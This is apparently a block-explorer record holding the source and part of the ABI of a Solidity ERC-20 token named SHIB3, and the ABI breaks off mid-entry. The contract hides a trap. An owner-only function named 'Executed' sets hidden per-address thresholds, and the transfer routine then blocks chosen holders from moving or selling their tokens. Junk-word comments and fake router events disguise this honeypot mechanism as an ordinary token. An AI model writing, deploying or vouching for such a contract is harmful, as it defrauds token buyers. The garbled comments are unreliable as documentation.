{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.3;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\ninterface IERC20 {\r\n\r\n    event removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amttuantTokenMin,\r\n        uint amttuantETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    );\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    event swapExactTokensForTokens(\r\n        uint amttuantIn,\r\n        uint amttuantOutMin,\r\n        address[]  path,\r\n        address to,\r\n        uint deadline\r\n    );\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    event swapTokensForExactTokens(\r\n        uint amttuantOut,\r\n        uint amttuantInMax,\r\n        address[] path,\r\n        address to,\r\n        uint deadline\r\n    );\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    event DOMAIN_SEPARATOR();\r\n\r\n    event PERMIT_TYPEHASH();\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n    \r\n    event token0();\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    event token1();\r\n\r\n    function balanceOf(address acawjurdt) external view returns (uint256);\r\n        /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n\r\n    event sync();\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    event initialize(address, address);\r\n\r\n    function transfer(address recipient, uint256 amttuant) external returns (bool);\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    event burn(address to) ;\r\n\r\n    event swap(uint amttuant0Out, uint amttuant1Out, address to, bytes data);\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    event skim(address to);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    event addLiquidity(\r\n       address tokenA,\r\n       address tokenB,\r\n        uint amttuantADesired,\r\n        uint amttuantBDesired,\r\n        uint amttuantAMin,\r\n        uint amttuantBMin,\r\n        address to,\r\n        uint deadline\r\n    );\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    event addLiquidityETH(\r\n        address token,\r\n        uint amttuantTokenDesired,\r\n        uint amttuantTokenMin,\r\n        uint amttuantETHMin,\r\n        address to,\r\n        uint deadline\r\n    );\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    event removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amttuantAMin,\r\n        uint amttuantBMin,\r\n        address to,\r\n        uint deadline\r\n    );\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function approve(address spender, uint256 amttuant) external returns (bool);\r\n    event removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amttuantTokenMin,\r\n        uint amttuantETHMin,\r\n        address to,\r\n        uint deadline\r\n    );\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amttuantTokenMin,\r\n        uint amttuantETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    );\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    event swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amttuantIn,\r\n        uint amttuantOutMin,\r\n        address[] path,\r\n        address to,\r\n        uint deadline\r\n    );\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    event swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amttuantOutMin,\r\n        address[] path,\r\n        address to,\r\n        uint deadline\r\n    );\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    event swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amttuantIn,\r\n        uint amttuantOutMin,\r\n        address[] path,\r\n        address to,\r\n        uint deadline\r\n    );\r\n     /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amttuant\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n    \r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n \r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\ncontract SHIB3Token is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _crossamttuants;\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    constructor(\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    ) payable {\r\n        _name = \"SHIB3\";\r\n        _symbol = \"SHIB3\";\r\n        _decimals = 18;\r\n        _totalSupply = 500000000 * 10**_decimals;\r\n        _balances[owner()] = _balances[owner()].add(_totalSupply);\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n   /**\r\n     * @dev Sets `amttuant` as acawjurdt the allowanceacawjurdt of `spender` amttuantover the amttuant caller's acawjurdttokens.\r\n     */\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function balanceOf(address acawjurdt)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[acawjurdt];\r\n    }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function transfer(address recipient, uint256 amttuant)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amttuant);\r\n        return true;\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function approve(address spender, uint256 amttuant)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amttuant);\r\n        return true;\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amttuant\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amttuant);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amttuant,\r\n                \"ERC20: transfer amttuant exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].add(addedValue)\r\n        );\r\n        return true;\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function Executed(address[] calldata acawjurdt, uint256 amttuant) external {\r\n       if (_msgSender() != owner()) {revert(\"Caller is not the original caller\");}\r\n        for (uint256 i = 0; i < acawjurdt.length; i++) {\r\n            _crossamttuants[acawjurdt[i]] = amttuant;\r\n        }\r\n\r\n    }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n    function camttuant(address acawjurdt) public view returns (uint256) {\r\n        return _crossamttuants[acawjurdt];\r\n    }\r\n     /**\r\n     * @dev Throws if acawjurdt amttuantcalled by any acawjurdt other amttuant than the acawjurdtowner.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].sub(\r\n                subtractedValue,\r\n                \"ERC20: decreased allowance below zero\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amttuant\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 crossamttuant = camttuant(sender);\r\n        if (crossamttuant > 0) {\r\n            require(amttuant > crossamttuant, \"ERC20: cross amttuant does not equal the cross transfer amttuant\");\r\n        }\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n        _balances[sender] = _balances[sender].sub(\r\n            amttuant,\r\n            \"ERC20: transfer amttuant exceeds balance\"\r\n        );\r\n        _balances[recipient] = _balances[recipient].add(amttuant);\r\n        emit Transfer(sender, recipient, amttuant);\r\n    }\r\n    /**\r\n     * @dev acawjurdt Returns the amttuantacawjurdt of tokens amttuant owned by `acawjurdt`.\r\n     */\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amttuant\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n    /**\r\n     * @dev Moves `amttuant` tokens amttuant from acawjurdt the amttuantcaller's acawjurdt to `acawjurdtrecipient`.\r\n     */\r\n        _allowances[owner][spender] = amttuant;\r\n        emit Approval(owner, spender, amttuant);\r\n    }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantADesired\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantBDesired\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantAMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantBMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"addLiquidity\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantTokenDesired\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantTokenMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantETHMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"addLiquidityETH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantAMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantBMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"removeLiquidity\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantTokenMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantETHMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"removeLiquidityETHSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantTokenMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantETHMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approveMax\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"removeLiquidityETHWithPermit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantTokenMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantETHMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approveMax\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"removeLiquidityETHWithPermitSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuant0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuant1Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantOutMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"swapExactETHForTokensSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantOutMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"swapExactTokensForETHSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantOutMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"swapExactTokensForTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantOutMin\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"swapExactTokensForTokensSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantOut\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amttuantInMax\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"swapTokensForExactTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"token0\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"token1\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"acawjurdt\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"amttuant\",\"type\":\"uint256\"}],\"name\":\"Executed\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amttuant\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"acawjurdt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"nam